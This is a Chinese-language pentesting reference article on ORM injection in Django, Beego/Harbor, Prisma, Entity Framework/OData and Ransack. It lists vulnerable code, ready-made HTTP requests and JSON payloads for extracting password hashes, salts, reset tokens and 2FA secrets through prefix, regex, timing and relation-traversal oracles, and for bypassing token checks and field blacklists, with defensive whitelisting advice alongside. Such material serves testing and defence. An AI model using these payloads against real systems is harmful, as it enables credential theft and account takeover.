---
attack_surface: [注入类]
impact: [身份伪造, 权限提升, 信息泄露]
risk_level: 高
prerequisites:
  - SQL 注入基础
  - ORM 框架概念 (Django/Prisma/Beego)
  - REST API 参数传递机制
difficulty: 高级
related_techniques:
  - sql-injection
  - nosql-injection
  - rsql-injection
  - ssrf-server-side-request-forgery
tools:
  - Burp Suite
  - curl
---

# ORM Injection — 跨框架对象关系映射注入

> 关联文档：[SQL Injection](../SQL%20Injection/README.md) · [NoSQL Injection](../NoSQL%20Injection/README.md) · [RSQL Injection](../RSQL%20Injection/README.md) · [SSRF](../../Reflected%20Values/SSRF/README.md)

---

# 0x01 背景与原理

## 1.1 什么是 ORM Injection

ORM（Object-Relational Mapping）框架将数据库表映射为编程语言的对象，允许开发者通过面向对象方式操作数据库。然而当 ORM 的**查询构建 API 过度信任用户输入**（尤其是 Python 的 `**kwargs` 展开、filter 参数合并、类型混淆等），攻击者可以通过注入 ORM 特有的操作符来操控查询。

## 1.2 为什么 ORM 不能完全防止注入

ORM 防止了经典的 SQL 拼接，但引入了新的攻击面：

```python
# Django 看似安全的代码：
def get_users(request):
    filters = {}
    for key, value in request.GET.items():
        filters[key] = value  # ← 参数名和值均来自用户
    return User.objects.filter(**filters)
# 请求: ?is_staff=True&email__startswith=a
# → User.objects.filter(is_staff=True, email__startswith='a')
# → 泄露 staff 用户的 email 前缀
```

**根因**：ORM API 的灵活性本身就是攻击面。开发者需要显式白名单化允许过滤的参数，而非依赖 ORM 自动消毒。

---

# 0x02 Django ORM

## 2.1 `**request.data` 展开注入

Django 的 QuerySet API 允许从参数自动构建 filter，常见漏洞模式：

```python
# 漏洞代码 — Django REST Framework
class UserViewSet(viewsets.ModelViewSet):
    queryset = User.objects.all()
    serializer_class = UserSerializer

    def get_queryset(self):
        queryset = super().get_queryset()
        # ⚠ 直接将所有 query params 传递给 filter
        return queryset.filter(**self.request.query_params.dict())
```

## 2.2 Django Field Lookup 操作符

Django 的 `filter()` 支持丰富的字段查找操作符，用双下划线语法 `field__lookup`：

| Lookup | 语法 | 语义 | 风险 |
|--------|------|------|------|
| `__exact` | `name__exact=admin` | 等于 | 低 |
| `__contains` | `name__contains=adm` | LIKE '%adm%' | 中 |
| `__startswith` | `name__startswith=a` | LIKE 'a%' | **高** — 含前缀盲注 |
| `__endswith` | `name__endswith=n` | LIKE '%n' | 中 |
| `__gt` / `__lt` | `id__gt=100` | 大于/小于 | 中 |
| `__gte` / `__lte` | `id__gte=1` | 大于等于 | 中 |
| `__in` | `id__in=1,2,3` | IN (1,2,3) | 低 |
| `__range` | `id__range=1,100` | BETWEEN | 低 |
| `__regex` | `name__regex=^a.*` | REGEXP | **高** — 正则注入 |
| `__isnull` | `reset_token__isnull=False` | IS NULL 检查 | 中 |
| `__year` / `__month` | `date__year=2024` | 日期提取 | 低 |

## 2.3 Django ORM 攻击 Payload

### 信息泄露 — 利用 `__startswith` 逐字符提取

```http
GET /api/users/?email__startswith=a     → 返回以 "a" 开头的用户
GET /api/users/?email__startswith=ad    → 进一步缩小
GET /api/users/?email__startswith=adm   → ...

# 利用逻辑：若返回非空结果，该前缀存在 → 逐字符提取完整 email

# 盲注版（仅返回计数/成功失败）
GET /api/users/?email__startswith=a     → {"count": 5}  → 5 个用户邮箱以 'a' 开头
GET /api/users/?email__startswith=aa    → {"count": 0}  → 无 → 无效前缀
```

### 关系遍历（Many-to-Many 绕过）

```http
# 假设 User 有 m2m 关系 → Group
# 攻击者可以注入关系过滤来查询其他用户所属的组
GET /api/users/?groups__name__startswith=Admin
# → 返回所有属于名称以 "Admin" 开头组的用户

# 权限绕过案例：
GET /api/users/?owned_projects__secret_flag=true
# 如果 User 与 Project 是 m2m 关系，且 Project 有 secret_flag 字段
# → 返回所有拥有 secret_flag=true 项目 的用户
```

### `__regex` 正则盲注

```http
GET /api/users/?email__regex=^[a-m].*@example\\.com
# → 返回 email 首字母在 a-m 范围内的用户（字母区间匹配）
```

### 滥用 Django 默认 M2M 关系（Group/Permission）

Django `AbstractUser` 模型**默认自带**与 `Group` 和 `Permission` 表的 Many-to-Many 关系，无需自定义模型即可跨用户遍历：

```bash
# 同组用户 → 泄露同组成员密码
created_by__user__groups__user__password

# 同权限用户 → 泄露共享权限的所有用户密码
created_by__user__user_permissions__user__password
```

> 这两个关系路径在**每个 Django 项目**中默认存在，是所有 Django ORM 注入的通用攻击面。

### 绕过显式过滤器限制

当代码使用 `is_secret=False` 等过滤器限制返回数据时，通过关系回环（loop-back）仍可泄露被过滤的数据：

```bash
# 代码: Article.objects.filter(is_secret=False, **request.data)
# 攻击: 从非秘密文章通过关系回环到秘密文章
Article.objects.filter(is_secret=False, categories__articles__id=2)
# → is_secret=False 作用于外层，但 JOIN 的 categories__articles 返回了秘密文章数据
```

### ReDoS 盲注 Oracle (`__regex`)

当应用返回统一响应（无法通过布尔差异区分）时，利用 `__regex` + ReDoS 产生时间差作为 oracle：

```json
// 不匹配密码 → 快速返回
{
    "created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"
}

// ReDoS 匹配密码 → 超时/错误（可观测时间差）
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
```

**DBMS 对 ReDoS 的影响**：

| DBMS | REGEXP 支持 | 回溯超时 | ReDoS 可用性 |
|------|-----------|---------|------------|
| **SQLite** | 默认无 REGEXP（需三方扩展） | N/A | 不可用 |
| **PostgreSQL** | 内建 `~` 操作符 | 无默认超时 | 可用，但回溯容忍度高 |
| **MariaDB** | `REGEXP` / `RLIKE` | 无超时 | **最佳目标** |

## 2.4 Django 防御

```python
# ✅ 正确做法：显式白名单允许的过滤字段
ALLOWED_FILTERS = ['name', 'email', 'department']

def get_queryset(self):
    queryset = User.objects.all()
    filters = {}
    for key in self.request.query_params:
        if key in ALLOWED_FILTERS:
            filters[key] = self.request.query_params[key]
        elif key.endswith('__startswith') and key.split('__')[0] in ALLOWED_FILTERS:
            filters[key] = self.request.query_params[key]
    return queryset.filter(**filters)
```

---

# 0x03 Beego ORM (Go/Harbor)

## 3.1 基础模式 — `QuerySeter.Filter()` 全控制

Beego ORM 镜像了 Django 的 `field__operator` DSL。当 handler 允许用户控制 `Filter()` 的第一个参数时，整个关系图完全暴露：

```go
// 漏洞代码 — 攻击者通过 URL 参数控制 filter key + value
qs := o.QueryTable("articles")
qs = qs.Filter(filterExpression, filterValue) // ← key 和 operator 均来自用户输入
```

## 3.2 Harbor 布尔 Oracle — 通过 `q` 参数泄露敏感字段

Harbor 的 `q` helper 将用户输入直接解析为 Beego ORM 过滤器。低权限用户可通过对列表响应进行布尔推断来探测任意字段：

```http
# 探测 password 字段是否包含 $argon2id$
GET /api/v2.0/users?q=password=~$argon2id$
# 若返回结果数 > 0 → 存在 Argon2 哈希密码

# 逐子串泄露 salt
GET /api/v2.0/users?q=salt=~abc
# 通过观察返回行数、分页元数据或响应长度差异建立 oracle
```

**Oracle 类型**：
- **计数差异**：匹配 vs 不匹配的返回结果数不同
- **分页元数据**：`X-Total-Count` 头或分页信息中的数量变化
- **响应体长度**：匹配时返回更多数据，响应更大

## 3.3 `parseExprs` 覆写原语 — 绕过 Harbor 字段黑名单

Harbor 尝试通过字段标签和首段验证保护敏感字段：

```go
// Harbor 的防御：只检查 __ 分隔后的第一段是否可过滤
k := strings.SplitN(key, orm.ExprSep, 2)[0]
if _, ok := meta.Filterable(k); !ok { continue }
qs = qs.Filter(key, value)
```

然而 Beego 内部的 `parseExprs` 逐段遍历 `__` 分隔的表达式——当前段不是关系名时，直接将目标字段**覆写**为下一段：

```http
# email__password__startswith=foo
# → Harbor 检查 Filterable("email")=true ✓ → 放行
# → Beego parseExprs 解析：
#     "email" → 是关系 → 跟随 JOIN
#     "password" → 不是关系 → 覆写目标字段为 password
#     "startswith" → 应用 LIKE 操作符
# → 实际执行：password__startswith=foo → 泄露密码前缀
```

## 3.4 v2.13.1 模糊匹配绕过

v2.13.1 限制 key 只能包含一个分隔符，但 Harbor 自己的模糊匹配构建器会在验证后追加操作符：

```http
# 原始请求（仅一个分隔符，通过 v2.13.1 验证）
GET /api/v2.0/users?q=email__password=~abc

# Harbor 内部追加 icontains 操作符
# → Filter("email__password__icontains", "abc")
# Beego ORM 解析："email" → JOIN → "password" → 覆写 → "icontains" → LIKE
# → 等价于 password__icontains=abc → 泄露密码包含 "abc" 的用户
```

**关键结论**：只要应用仅检查第一个 `__` 组件，或在处理管道后续追加操作符，Beego 的覆写原语将持续生效——任何被黑名单的字段都可能通过关系链前缀绕过。

**CVE 路径**：
```
[Harbor API 端点接受任意 query params]
  → [q helper 构建 Beego Filter 表达式]
  → [parseExprs 逐段解析，非关系段覆写目标字段]
  → [注入 "__icontains" / "__gt" / "__startswith" 等操作符]
  → [绕过字段黑名单 / 泄露密码哈希 / salt / TOTP 种子]
```

---

# 0x04 Prisma ORM (Node.js/TypeScript)

## 4.1 `findMany` 全控制注入

Prisma 的 `findMany` / `findFirst` 接收一个完整的查询对象，如果应用直接把用户输入合并到查询中：

```javascript
// 漏洞代码
app.get('/api/users', async (req, res) => {
  // ⚠ 直接将 req.query 展开为 Prisma 查询参数
  const users = await prisma.user.findMany({
    where: req.query.where,  // ← 攻击者可完全控制 where
    select: req.query.select  // ← 攻击者可控制返回字段
  });
  res.json(users);
});
```

### Prisma 敏感字段提取

```http
# 攻击请求 — 通过 select 注入提取 password 字段
GET /api/users?select={"id":true,"email":true,"password":true}
# → SELECT id, email, password FROM users;

# 通过 where 注入利用操作符
GET /api/users?where={"email":{"startsWith":"admin"}}
# → WHERE email LIKE 'admin%'
```

## 4.2 Prisma 类型混淆（操作符注入）

Prisma 的 `where` 子句接受标量值或操作符对象。当 handler 假设用户输入是普通字符串但直接传入 `where` 时，攻击者可走私操作符绕过认证检查：

```ts
// 漏洞代码 — resetToken 期望 string，但实际可接受 object
const user = await prisma.user.findFirstOrThrow({
    where: { resetToken: req.body.resetToken as string }
})
```

### 操作符注入向量

| 向量 | 示例 | 效果 |
|------|------|------|
| **JSON body** (`express.json()`) | `{"resetToken":{"not":"E"},"password":"newpass"}` | 匹配所有 token 不为 "E" 的用户 |
| **URL-encoded** (`extended: true`) | `resetToken[not]=E&password=newpass` | 同上——括号语法展开为对象 |
| **Query string** (Express <5) | `/reset?resetToken[contains]=argon2` | 子串匹配泄露 |
| **cookie-parser JSON** | `Cookie: resetToken=j:{"startsWith":"0x"}` | 若 cookie 被转发给 Prisma → 前缀匹配 |

**核心问题**：`{ resetToken: { not: ... } }`、`{ contains: ... }`、`{ startsWith: ... }` 等操作符对象被 Prisma 正常求值，任何对秘密值（reset token、API key、magic link）的等值检查都可被扩展为无需知道秘密即可成功的谓词。

### 高危场景识别

- 请求 schema 未强制校验 → 嵌套对象存活至反序列化
- 扩展 body/query 解析器保持启用并接受括号语法
- handler 直接将用户 JSON 传入 Prisma 而非映射到白名单字段/操作符

## 4.3 多对多关系绕过固定过滤器

当代码在 `where` 中硬编码过滤条件（如 `published: true`）时，通过多对多关系回环仍可泄露被过滤的数据：

```javascript
// 漏洞代码 — published 被硬编码为 true
app.post("/articles", async (req, res) => {
  try {
    const query = req.body.query
    query.published = true  // ← 试图限制为已发布文章
    const posts = await prisma.article.findMany({ where: query })
    res.json(posts)
  } catch (error) {
    res.json([])
  }
})
```

### 绕过 Payload — `Category` ←→ `Article` 多对多回环

```json
{
  "query": {
    "categories": {
      "some": {
        "articles": {
          "some": {
            "published": false,
            "{articleFieldToLeak}": {
              "startsWith": "{testStartsWith}"
            }
          }
        }
      }
    }
  }
}
```

`published: true` 作用于外层 article，但 JOIN 通过 `Category ↔ Article` 多对多关系回环至内层 article——内层的 `published: false` 条件可匹配未发布文章并泄露其字段。

### 泄露所有用户 — 深度嵌套关系回环

通过部门 ↔ 员工的多对多关系反复回环，可从一个创建者遍历到系统中所有用户：

```json
{
  "query": {
    "createdBy": {
      "departments": {
        "some": {
          "employees": {
            "some": {
              "departments": {
                "some": {
                  "employees": {
                    "some": {
                      "{fieldToLeak}": {
                        "startsWith": "{testStartsWith}"
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

## 4.4 Error/Timed 盲注 Oracle

当应用返回统一响应（无法通过结果差异区分真/假）时，利用 Prisma 的 OR/NOT 结构与大量字符串匹配产生时间延迟作为 oracle：

```json
{
  "OR": [
    {
      "NOT": { /* ORM_LEAK — 待验证的泄露条件 */ }
    },
    { /* CONTAINS_LIST — 1000+ 字符串的列表 */ }
  ]
}
```

**原理**：当 `ORM_LEAK` 条件为真时，`NOT` 使其为假 → 数据库必须扫描完整的 `CONTAINS_LIST`（1000+ 字符串）→ 响应时间显著增加。当 `ORM_LEAK` 条件为假时，`OR` 的第一个分支已为真 → 数据库短路跳过列表扫描 → 快速返回。

**时间差即为 Oracle**。

---

# 0x05 Entity Framework (C#) / OData

## 5.1 OData 基础注入

OData 端点默认暴露丰富的查询功能：

```http
# $filter 注入
GET /odata/Users?$filter=startswith(Email,'a')
# → SELECT * FROM Users WHERE Email LIKE 'a%'

# $expand 权限绕过
GET /odata/Users?$expand=Secrets
# → 如果 Secrets 导航属性未正确配置权限 → 暴露敏感关系

# $select 敏感字段
GET /odata/Users?$select=Id,Email,PasswordHash
# → SELECT Id, Email, PasswordHash → 暴露不应返回的字段
```

## 5.2 反射型 `TextFilter<T>` — 全字段泄露

基于反射的文本搜索 helper 枚举所有 string 属性并包裹 `.Contains(term)`，将密码、API token、salt、TOTP 种子暴露给任何可调用端点的用户：

```csharp
IQueryable<T> TextFilter<T>(IQueryable<T> source, string term) {
    var stringProperties = typeof(T).GetProperties()
        .Where(p => p.PropertyType == typeof(string));
    if (!stringProperties.Any()) { return source; }
    var containsMethod = typeof(string).GetMethod("Contains", new[] { typeof(string) });
    var prm = Expression.Parameter(typeof(T));
    var body = stringProperties
        .Select(prop => Expression.Call(
            Expression.Property(prm, prop), containsMethod!, Expression.Constant(term)))
        .Aggregate(Expression.OrElse);
    return source.Where(Expression.Lambda<Func<T, bool>>(body, prm));
}
```

**CVE-2025-64748 (Directus)**：`directus_users` 搜索端点将 `token` 和 `tfa_secret` 包含在自动生成的 `LIKE` 谓词中——通过结果计数差异即可逐字符提取完整 2FA 种子。

## 5.3 OData 比较 Oracle（无 `contains` 函数时）

即使禁用了 `contains`/`startswith` 等函数，只要 EDM 暴露了属性，仍可通过比较操作符建立 oracle：

```http
# 逐字符二分查找 — 根据数据库排序规则
GET /odata/Articles?$filter=CreatedBy/TfaSecret ge 'M'&$top=1
GET /odata/Articles?$filter=CreatedBy/TfaSecret lt 'M'&$top=1
# 结果存在/不存在（或分页元数据差异）→ 每个字符的布尔 oracle
```

导航属性（`CreatedBy/Token`、`CreatedBy/User/Password`）实现与 Django/Beego 相同的关系遍历，任何未对每个属性施加拒绝列表的 EDM 都可能成为攻击目标。

**关键原则**：将用户输入字符串翻译为 ORM 操作符的库和中间件（Entity Framework 动态 LINQ helper、Prisma/Sequelize wrapper），除非实现了严格的字段/操作符白名单，否则应视为高风险 sink。

---

# 0x06 Ransack (Ruby)

Ransack 是 Ruby on Rails 常用的搜索 gem，默认允许 `_cont` 等谓词：

```http
# Ransack 查询语法
GET /users?q[name_cont]=admin&q[email_start]=a

# 危险谓词
# _eq (等于), _not_eq (不等于)
# _cont (包含), _start (以...开始), _end (以...结尾)
# _gt, _lt, _gteq, _lteq
# _present (IS NOT NULL), _blank (IS NULL)
# _in (IN), _not_in (NOT IN)
```

---

# 0x07 跨框架攻击模式总结

| 模式 | Django | Prisma | Ransack | Beego |
|------|--------|--------|---------|-------|
| **前缀盲注** | `field__startswith` | `startsWith` | `field_start` | `field__startswith` |
| **正则注入** | `field__regex` | 版本依赖 | N/A | N/A |
| **关系遍历** | `related__field` | `include/nested` | `field_of_Model` | N/A |
| **NULL 检查** | `field__isnull` | `equals: null` | `field_null` | N/A |
| **范围泄露** | `field__gt/__lt` | `gt/lt/gte/lte` | `field_gt/lt` | `field__gt` |
| **排序泄露** | `order_by=field` | `orderBy=field` | `s=field+asc` | N/A |

---

# 0x08 通用防御策略

1. **白名单过滤**：所有暴露的 filter/sort/select 参数必须经过显式白名单
2. **禁止 `**kwargs` 展开**：不允许 `Model.objects.filter(**request.GET.dict())`
3. **使用 API 序列化层**：Django REST Framework 的 `Serializer` + `FilterBackend` 白名单
4. **限制关系遍历深度**：禁止嵌套超过 2 层的关系查询
5. **审计 ORM 查询日志**：在 SQL 级别（`django.db.connection.queries`）记录并定期检测异常查询模式

---

# 0x09 Collation 感知泄露策略

字符串比较继承数据库 collation 设置，盲注 oracle 必须根据后端排序规则校准：

- **MariaDB / MySQL / SQLite / MSSQL 默认 collation 通常不区分大小写** → `LIKE` / `=` 无法区分 `a` 与 `A`。若秘密值的大小写具有安全意义，必须使用区分大小写的操作符（regex / GLOB / BINARY）
- **Prisma 与 Entity Framework 镜像数据库排序规则** → MSSQL 的 `SQL_Latin1_General_CP1_CI_AS` 将标点符号排在数字和字母之前 → 二分搜索探针必须按此顺序而非纯 ASCII 字节序
- **SQLite 的 `LIKE` 默认不区分大小写**（除非注册自定义 collation）→ Django / Beego 泄露可能需要 `__regex` 谓词恢复区分大小写的 token
- **校准 payload 至实际 collation** → 避免无效探针，显著加速自动化子串/二分搜索攻击

---

# 0x0A 参考资料

- [Django — QuerySet API Reference (Field Lookups)](https://docs.djangoproject.com/en/stable/ref/models/querysets/#field-lookups)
- [HackTricks — ORM Injection](https://book.hacktricks.xyz/pentesting-web/orm-injection)
- [Prisma — Filtering & Sorting](https://www.prisma.io/docs/orm/prisma-client/queries/filtering-and-sorting)
- [Ransack — Search Matchers](https://activerecord-hackery.github.io/ransack/getting-started/search-matches/)
- [OData — Query Options Overview](https://www.odata.org/documentation/odata-version-2-0/uri-conventions/)
- [elttam — PlORMbing Your Django ORM](https://www.elttam.com/blog/plormbing-your-django-orm/)
- [elttam — PlORMbing Your Prisma ORM](https://www.elttam.com/blog/plorming-your-primsa-orm/)
- [elttam — Leaking More Than You Joined For (M2M Loop-back)](https://www.elttam.com/blog/leaking-more-than-you-joined-for/)
- [positive.security — Ransack Data Exfiltration](https://positive.security/blog/ransack-data-exfiltration)
